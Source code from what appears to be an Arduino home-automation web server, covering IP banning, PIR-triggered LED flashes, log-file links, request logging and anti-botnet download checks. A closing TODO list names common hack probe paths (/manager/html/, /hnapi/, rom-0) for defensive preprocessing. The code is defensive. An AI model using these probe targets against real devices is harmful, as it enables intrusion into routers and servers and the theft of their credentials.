  String l_parm = HTMLParmRead(E_IPADDRESS_296);
  byte l_ip_address[DC_IPAddressFieldCount];

  //Convert to an ip address array
  int l_posn = 0;
  for (byte l_index = 0; l_index < DC_IPAddressFieldCount; l_index++) {
    l_ip_address[l_index] = ENDF2(l_parm, l_posn, '.').toInt();
    if (l_posn == -1)
      break;
    //
  }

  //Now iterate the Banned IP Address list
  for (byte l_index = 0; l_index < DC_FailedHTMLRequestListCount; l_index++) {
    if ((G_FailedHTMLRequestList[l_index].IPAddress[0] == l_ip_address[0]) &&
        (G_FailedHTMLRequestList[l_index].IPAddress[1] == l_ip_address[1]) &&
        (G_FailedHTMLRequestList[l_index].IPAddress[2] == l_ip_address[2]) &&
        (G_FailedHTMLRequestList[l_index].IPAddress[3] == l_ip_address[3])) {
      //Found the IP Adrress - delete it from the table
      for (byte l_idx = 0; l_idx < DC_IPAddressFieldCount; l_idx++)
        G_FailedHTMLRequestList[l_index].IPAddress[l_idx] = 0;
      //
      G_FailedHTMLRequestList[l_index].AttemptCount = 0;
      G_FailedHTMLRequestList[l_index].BanType[0] = '\0';
      G_FailedHTMLRequestList[l_index].LastDateTime = 0;
      CheckRAM();
      Pop(c_proc_num);
      return; //return to calling procedure, our work is done
    }
  }

  //The IP Address was not found so we will insert it
  //"XXX" forces an immediate ban
  UpdateBannedIPAddressTable(l_ip_address, "XXX"); //Ignore returned IP address index

  CheckRAM();
  Pop(c_proc_num);
} //ProcessWebPageIPAddress

//----------------------------------------------------------------------------------------
#ifdef D_2WGApp
void PIRRGBLEDFlash(const int p_pir) {
  //The RGD LED is flashed whenever any PIR is activated

  const byte c_proc_num = 102;
  const int C_PIR_Delay = 500;
  Push(c_proc_num);

  //If the nightlight is on AND we are not already performing a PIR flash
  //then turn the night light off.
  if ((G_LEDNightLightTimer != 0) && (G_PIRLightTimer == 0))
    SetRGBLEDLightColour(0, 0, 0, true); //Off
  //
  //Now the RGB light is off OR operating in PIR flash mode
  //We can add another colour for this LED.

  if (p_pir == DC_LoungePIRInterrupt1_3)
    SetRGBLEDLightColour(255, 0, 0, true);    //Red
  else if (p_pir == DC_HallwayPIRInterrupt2_21)
    SetRGBLEDLightColour(0, 255, 0, true);    //Green
  else if (p_pir == DC_BathroomPIRInterrupt5_18)
    SetRGBLEDLightColour(255, 255, 0, true);  //Yellow
  //
  /*
    //We can flash six different colours for the six different PIRS
    //this way as an alternative.
    int l_red = 0;
    int l_blue = 0;
    int l_green = 0;
    if (p_pir == DC_LoungePIRInterrupt1_3)
      l_red = 255;
    else if (p_pir == DC_HallwayPIRInterrupt2_21)
      l_green = 255;
    else if (p_pir == DC_BedroomPIRInterrupt0_2)
      l_blue = 255;
    else if (p_pir == DC_GaragePIRInterrupt3_20) {
      l_red = 255;     //yellow
      l_green = 255;
    }
    else if (p_pir == DC_BathroomPIRInterrupt5_18) {
      l_red = 80;   //purple
      l_blue = 80;
    }
    else if (p_pir == DC_PatioPIRInterrupt4_19) {
      l_green = 255; //aqua
      l_blue = 255;
    }

    SetRGBLEDLightColour(l_red, l_green, l_blue, true);
  */
  //Reset the PIR Light Timer - will run for half a second with this light combo
  G_PIRLightTimer = millis();

  CheckRAM();
  Pop(c_proc_num);
} //PIRRGBLEDFlash

//----------------------------------------------------------------------------------------

void FlashRGBLED() {
  //We flash all the colors during a setup test.
  const byte c_proc_num = 96;
  const int C_PIR_Delay = 1000;
  Push(c_proc_num);

  SetRGBLEDLightColour(255, 0, 0, false); // red
  delay(C_PIR_Delay);
  SetRGBLEDLightColour(0, 255, 0, false); // green
  delay(C_PIR_Delay);
  SetRGBLEDLightColour(0, 0, 255, false); // blue
  delay(C_PIR_Delay);
  SetRGBLEDLightColour(255, 255, 0, false); // yellow
  delay(C_PIR_Delay);
  SetRGBLEDLightColour(80, 0, 80, false); // purple
  delay(C_PIR_Delay);
  SetRGBLEDLightColour(0, 255, 255, false); // aqua
  delay(C_PIR_Delay);
  SetRGBLEDLightColour(255, 255, 255, false); // white
  delay(C_PIR_Delay * 2);
  SetRGBLEDLightColour(0, 0, 0, true); // OFF
  CheckRAM();
  Pop(c_proc_num);
} //FlashRGBLED

//----------------------------------------------------------------------------------------

void SetRGBLEDLightColour(int p_red, int p_green, int p_blue, boolean p_save) {
  const byte c_proc_num = 97;
  Push(c_proc_num);

#ifdef COMMON_ANODE
  p_red   = 255 - p_red;
  p_green = 255 - p_green;
  p_blue  = 255 - p_blue;
#endif

  if (p_save) {
    G_LED_Red   = p_red;
    G_LED_Green = p_green;
    G_LED_Blue  = p_blue;
  }
  analogWrite(GC_RedPin, p_red);
  analogWrite(GC_GreenPin, p_green);
  analogWrite(GC_BluePin, p_blue);
  CheckRAM();
  Pop(c_proc_num);
} //SetRGBLEDLightColour
#endif

//----------------------------------------------------------------------------------------

void InsertLogFileLinks(const int p_log) {
  //Insert one log file links OR all five of them when p_log == 0
  const byte c_proc_num = 98;
  Push(c_proc_num);

  if (!G_SDCardOK) {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }

  //Initialise Date/Time info
  int l_dd, l_mm, l_yyyy, l_hh, l_min = 0;
  DateDecode(Date(), &l_dd, &l_mm, &l_yyyy);
  TimeDecode(Now(), &l_hh, &l_min);

  //DC_Activity_Log 3
  //DC_Hack_Attempt_Log 4
  //DC_Crawler_Request_Log 5
  //DC_CWZ_Request_Log 6
  //DC_HTML_Request_Log 7
  int l_start;
  int l_end;
  if (p_log == 0) {
    l_start = DC_Activity_Log; //(3)
    l_end   = DC_HTML_Request_Log;
  } //(7)
  else { //Just one log file
    l_start = p_log;
    l_end   = p_log;
  }

  for (int l_log_file = l_start; l_log_file <= l_end; l_log_file++) {

    if ((l_log_file == DC_Hack_Attempt_Log) ||
        (UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {

      int l_EEPROM_desc;
      if (l_log_file == DC_Activity_Log) //(3)
        l_EEPROM_desc = E_Activity_310;
      else if (l_log_file == DC_Hack_Attempt_Log) //(4)
        l_EEPROM_desc = E_Hacker_326;
      else if (l_log_file == DC_Crawler_Request_Log) //(5)
        l_EEPROM_desc = E_Crawler_311;
      else if (l_log_file == DC_CWZ_Request_Log) //(6)
        l_EEPROM_desc = E_Catweazle_327;
      else
        l_EEPROM_desc = E_Public_328;
      //

      //DetermineFilename is a common procedure for log file name generation
      //Includes forcing or new (sub) directories/folders
      //It knows which files are daily only and which ones are four hourly
      String l_filename = DetermineFilename(l_log_file);
      //Serial.println(l_filename);

      SPIDeviceSelect(DC_SDCardSSPin);
      boolean l_exists = SD.exists(&l_filename[0]);
      SPIDeviceSelect(DC_EthernetSSPin);
      if (l_exists) {
        G_EthernetClient.print(F("<a href=/"));
        G_EthernetClient.print(l_filename);
        if ((l_log_file == DC_Crawler_Request_Log) || (l_log_file == DC_HTML_Request_Log))
          G_EthernetClient.print(F("/>Current "));
        else
          G_EthernetClient.print(F("/>Today's "));
        //
        G_EthernetClient.print(EPSR(l_EEPROM_desc));
        G_EthernetClient.println(F(" Log</a><br>"));
      } //Skip links where the file not yet created
    } //if hacklog or user is logged in
  } //for each of four log files
  CheckRAM();
  Pop(c_proc_num);
} //InsertLogFileLinks

//----------------------------------------------------------------------------------------

void DumpHTMLRequest() {
  //An issue has been detected quite early in the html request parsing (e.g. invalid URL)
  //Dump the rest of the HTML Request to the log file
  const byte c_proc_num = 101;
  Push(c_proc_num);
  String l_line = "";
  while (G_EthernetClient.available()) {
    l_line = ExtractECLineMax(128, true); //Perform XSS transformation
    l_line.trim();
    //If we get a blank line we have finished.
    if (l_line == "") //We have finished the iterative looping
      break;
    //
    HTMLWrite("- " + l_line);
  }
  //Any remaining POST form data (incl multi-part form data)
  //will be discarded in EthernetClientStop()
  CheckRAM();
  Pop(c_proc_num);
  return; //EOF (blank line)
} //DumpHTMLRequest

//----------------------------------------------------------------------------------------

boolean LocalIP(byte p_rip[]) {
  const byte c_proc_num = 116;
  Push(c_proc_num);
  if ((p_rip[0] == 192) && (p_rip[1] == 168)) {
    CheckRAM();
    Pop(c_proc_num);
    return true;
  }
  else {
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }
}

//----------------------------------------------------------------------------------------

boolean Check4WaitingLocalHTMLReq() {
  //During a long web server process (e.g. File Download) we check other
  //W5100 sockets to see if there are any local waiting html requests.
  //If yes the calling procedure will terminate to allow the local html
  //request to be priority processed.
  const byte c_proc_num = 119;
  Push(c_proc_num);

  //SPIDeviceSelect(DC_EthernetSSPin); //This is active

  //We ignore this if we are already a local IP Address
  if (LocalIP(G_RemoteIPAddress)) {
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }

  int l_current_socket = G_EthernetClient.getSocketNum();
  uint8_t l_dip[4];
  for (int l_socket = 0; l_socket < MAX_SOCK_NUM; l_socket++) {
    if (l_socket != l_current_socket) {
      //These port statuses may contain waiting html requests
      if ((W5100.readSnSR(l_socket) == SnSR::ESTABLISHED) ||
          (W5100.readSnSR(l_socket) == SnSR::CLOSE_WAIT)) {
        //if (W5100.getRXReceivedSize(l_socket)) {
        W5100.readSnDIPR(l_socket, l_dip);
        if (LocalIP(l_dip)) {
          ActivityWrite(EPSR(E_HTML_Process_Termination_316) + "- " + String(G_RemoteIPAddress[0]) + '.' +
                        String(G_RemoteIPAddress[1]) + '.' + String(G_RemoteIPAddress[2]) + '.' + String(G_RemoteIPAddress[3]));
          CheckRAM();
          Pop(c_proc_num);
          return true;
        }
        //} //Only want posts with available data
      } //Only want ports with either of these two statuses
    } //skip current socket
  } //for each socket
  CheckRAM();
  Pop(c_proc_num);
  return false;
} //Check4WaitingHTMLReq

//----------------------------------------------------------------------------------------

boolean CheckRecentIPAddress() {
  //We do not allow robots, hackers and botnets to download
  //random files  in the absence of other web browsing activity.
  //This is a response to botnets that pull single files many times
  //  a day from IP addresses all around the world and could potential cause a DOS.
  //We do not come here if the file request is for robots.txt
  const byte c_proc_num = 125;
  Push(c_proc_num);

  //Web crawlers are allowed to randomly download files
  //It is part of their normal crawling activity
  if (G_Web_Crawler_Index != -1) {
    CheckRAM();
    Pop(c_proc_num);
    return true;
  }

  //We allow Arduino referals
  if (HTMLParmRead(E_ARDUINO_332) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return true;
  }

  for (byte l_ip_addr = 0; l_ip_addr < G_RecentIPAddressCount; l_ip_addr++) {
    boolean l_match = true;
    for (byte l_field = 0; l_field < DC_IPAddressFieldCount; l_field++) {
      if (G_RemoteIPAddress[l_field] != G_Recent_IPAddresses[l_ip_addr].IPField[l_field]) {
        l_match = false;
        break;
      }
    }
    if (l_match) {
      CheckRAM();
      Pop(c_proc_num);
      return true;
    }
  }
  //Current IP Address not found in the recent four IP addressses
  //Disallow this file access attempt (completely ignore the botnet)
  CheckRAM();
  Pop(c_proc_num);
  return false;
} //CheckRecentIPAddress

//---------------------------------------------------------------------------------------

/*
  void DumpHackLogs() {
  //Dump the last 30 days of hack log files to a hackers browser
  //after the error page header has been transmitted.
  //Only while they are connected
  //Only whole no other html request is waiting

  //Now dump the file to the ethernetclient in buffered blocks
  //Consider bigger buffer size to see if we can get faster performance
  //Beware of running out of SRAM
  const byte c_proc_num = 100;
  Push(c_proc_num);

  const byte c_file_buffer_size = 128;
  byte l_buffer[c_file_buffer_size];

  int l_dd, l_mm, l_yyyy = 0;
  String l_directory = "";
  String l_sub_filename = "";
  for (int l_day = 1; l_day <= 30; l_day++) {
    DateDecode(Date() - (l_dy * 100000), &l_dd, &l_mm, &l_yyyy);
    String l_directory = String(EPSR(E_HACKLOGSsl_144) + ZeroFill(l_yyyy, 4) + "/" + ZeroFill(l_mm, 2));
    String l_sub_filename = String(ZeroFill(l_mm, 2) + ZeroFill(l_dd, 2) + ".TXT");
    SPIDeviceSelect(DC_SDCardSSPin);

    int l_count = 0;
    SPIDeviceSelect(DC_SDCardSSPin);

    //Check if file exists
    //open the file

    {
      while (l_file.available()) {

        SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
        //Return if there is a waiting ethernetclient
        for (uint8_t l_sock = 0; l_sock < MAX_SOCK_NUM; l_sock++) {
          uint8_t l_status = W5100.readSnSR(l_sock); //status
          if (l_status != 0x17) ||   //17 ESTABLISHED
             (l_status != 0x1C {   //1C CLOSE_WAIT
            EthernetClientStop(); //Discards the HTMLParmList (not the cache)
            Pop(c_proc_num);
            return;
          }
        }

        //Return of this connection has been dropped
        if (!G_EthernetClient.connected()) {
          EthernetClientStop(); //Discards the HTMLParmList (not the cache)
          Pop(c_proc_num);
          return;
        }

        SPIDeviceSelect(DC_SDCardSSPin);
        l_count = l_file.read(l_buffer, c_file_buffer_size);
        if (l_count == 0)
          break;
        //
        SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
        G_EthernetClient.write(l_buffer, l_count);
      } //Iterate to dump this file
    }
    //CLose the file
    SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
  } //for each of 30 days
  EthernetClientStop(); //Discards the HTMLParmList (not the cache)
  Pop(c_proc_num);
  return;
  }
*/
//----------------------------------------------------------------------------------------
//END OF FILE
//----------------------------------------------------------------------------------------

//----------------------------------------------------------------------------------------
//TODO LIST
//----------------------------------------------------------------------------------------
/*
  Common Hacks to Preprocess
  - /manager/html/
  - /hnapi/
  - rom-0

  EEPROM - Eliminate web page upper/lower case duplicates.

  Reimplement Heating reporting

  Restructure WebserverProcess to reduce SRAM
  Click on hacker IP to extract a list of their URL requests

  Record SRAM Usage statistics as well as the hierarachy.
  (Need int G_RAMData.Value[DC_CallHierarchyCount]) and same for each 15 levels of the statistics
  Review SRAM usage stats and endeavour to eliminate peak SRAM scenarios.

  Convert millis() timers to Datetime timers via Now() etc.

  House number lighting at letterbox.

  Reduce Serial input buffer from 64 is a future memory saving option

  DetermineStatType() - Use one EEPROM String with delimited fields
  LoadAlarmTimesSPIBA() - Use one EEPROM String with delimited fields

  Create a T/F setting to allow all html header fields that we have no interest in to
  be disccard - these keeps them out of the logs and reduces our caching requirement.

  WebServerCheckValidRequest() - CGI, ASP, PHP, HTM, etc to EEPROM field list?

  Move WebCrawler list to EEPROM field list

  Move C_SensorList to an EEPROM field list

  Statistic Banned IP Addresses WPE to be renames Hacker Activity WPE
*/


